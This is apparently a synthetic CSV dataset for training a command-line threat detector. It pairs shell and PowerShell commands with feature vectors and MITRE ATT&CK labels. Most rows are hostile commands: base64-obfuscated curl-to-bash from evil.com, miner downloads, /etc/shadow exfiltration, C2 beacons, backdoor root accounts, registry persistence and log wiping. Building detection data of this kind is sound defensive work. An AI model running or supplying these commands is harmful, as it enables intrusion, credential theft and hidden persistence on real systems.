"bash -c ""echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
"bash -c ""systemctl enable --now malicious.service""","[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1053_Scheduled_Task'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykpIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'ZmluZCAvdmFyL2xvZyAtbmFtZSAnKi5sb2cnIC1leGVjIHRydW5jYXRlIC1zIDAge30gXDs=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd  -m  -s  /bin/bash  hacker  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'bm1hcCAtc24gMTkyLjE2OC4xLjAvMjQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
route -n | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo  'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJiB8IGVjaG8gZG9uZQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && > /dev/null 2>&1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.6, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c ""exec(__import__('base64').b64decode('aW1wb3J0IG9z').decode())"" && chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggaGFja2VyICYmIHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'c3lzdGVtY3RsIGVuYWJsZSAtLW5vdyBtYWxpY2lvdXMuc2VydmljZSA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
tar -czf backup.tar.gz /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
ip link show && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
vim  /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
whoami /all | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')),"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time crontab -l,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'ZWNobyAnJyA+IC92YXIvbG9nL3N5c2xvZw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""crontab -e && history -c""","[0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty  -Path  'HKLM:\...'  -Name  Persist  -Value  'C:\payload.exe'  ;  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo ip route show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'bHNjcHU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
net  user  /domain  &&  >  /dev/null  2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'Y3JvbnRhYiAtZQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
cat ~/.aws/credentials,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.56, 1, 1]",['T1496_Resource_Hijacking'],synthetic
echo  'Y2F0IC9ldGMvcmVzb2x2LmNvbmY='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
cat ~/.ssh/id_rsa ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time echo 'dXNlcmFkZCAtbSAtcyAvYmluL2Jhc2ggLUcgc3VkbyBuZXdhZG1pbiAmJiBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
sudo certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.28, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIC1vIC90bXAvc2hlbGwuc2g=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
time echo 'Z2V0ZW50IHBhc3N3ZCB8IGF3ayAtRjogJyQzID49IDEwMDAn' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1087_Account_Discovery'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
time cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  'bmMgLXp2IDEwLjAuMC4xIDEtMTAwMCAyPiYxIHwgZ3JlcCBzdWNjZWVkZWQ='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""psexec.py Administrator:password@10.0.0.5 cmd.exe""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
nohup id -Gn &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe ; > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.52, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
su -s /bin/bash www-data | sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
time New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68' | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/group && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""vim /etc/hosts""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
cat /etc/os-release && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup shred -u /var/log/auth.log ; sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time route -n ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""python3 -c 'import socket,subprocess,os;...'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
time echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
su -s /bin/bash www-data && > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""strings /proc/*/mem | grep -i password""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
"bash -c ""history -c && history -w""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1070_Indicator_Removal'],synthetic
for i in $(seq 1 254); do ping -c1 -W1 192.168.0.$i &>/dev/null && echo 192.168.0.$i; done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.64, 1, 0]",['T1018_Remote_System_Discovery'],synthetic
nbtscan 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
sudo echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe' && echo done""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.64, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""su -s /bin/bash www-data""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
nohup medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1110_Brute_Force'],synthetic
lsb_release  -a  |  sleep  1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nbtscan 192.168.1.0/24 ; history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"bash -c ""lscpu""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
./pwnkit ; chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
cat /etc/resolv.conf | chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget -q -O- --header='X-Auth: token123' http://evil.com/cmd &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'Y2F0IH4vLnNzaC9pZF9yc2EgOyBzbGVlcCAx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""cat /etc/os-release""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
wmic  useraccount  list  &&  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow | echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'Y2F0IH4vLmF3cy9jcmVkZW50aWFscyA7ID4gL2Rldi9udWxsIDI+JjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
